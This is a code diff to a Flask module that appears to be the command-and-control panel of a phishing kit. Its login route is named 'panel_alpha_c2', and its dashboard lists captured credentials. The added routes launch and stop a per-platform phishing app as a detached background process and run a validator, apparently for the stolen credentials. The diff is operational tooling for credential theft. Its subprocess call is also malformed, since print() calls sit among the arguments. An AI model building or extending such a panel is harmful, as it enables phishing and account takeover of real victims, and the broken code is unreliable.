@@ -1,8 +1,11 @@
 from flask import Blueprint, render_template, request, redirect, url_for, session
 import sqlite3
 import os
+import subprocess
+import signal
 from .auth import login_required
 
+phishing_process = None
 routes = Blueprint('routes', __name__)
 
 @routes.route('/panel_alpha_c2/login', methods=['GET', 'POST'])
@@ -31,3 +34,48 @@ def dashboard():
     rows = cursor.fetchall()
     conn.close()
     return render_template('dashboard.html', credentials=rows)
+
+@routes.route('/launch/<platform>')
+def launch_phishing(platform):
+    global phishing_process
+
+    if phishing_process:
+        phishing_process.terminate()
+
+    phishing_app_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../app.py'))
+
+    phishing_process = subprocess.Popen(
+        ['python3', phishing_app_path, platform],
+        #DEBUG
+        print(f"[~] Lanzando phishing para {platform}..."),
+        print(f"[~] Ejecutando: python3 {phishing_app_path} {platform}"),
+        stdout=open("phishing_stdout.log", "w"),
+        stderr=open("phishing_stderr.log", "w"),
+        start_new_session=True
+        #DEBUG
+        #stdout=subprocess.PIPE,
+        #stderr=subprocess.PIPE
+    )
+
+    return redirect(url_for('routes.dashboard'))
+
+@routes.route('/stop_phishing')
+def stop_phishing():
+    global phishing_process
+
+    if phishing_process:
+        os.killpg(os.getpgid(phishing_process.pid), signal.SIGTERM)
+        phishing_process = None
+
+    return redirect(url_for('routes.dashboard'))
+
+@routes.route('/validate_now')
+def validate_now():
+    validator_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../app/validator.py'))
+
+    try:
+        subprocess.Popen(['python3', validator_path])
+    except Exception as e:
+        print(f"Error when trying to execute validator: {e}")
+
+    return redirect(url_for('routes.dashboard'))
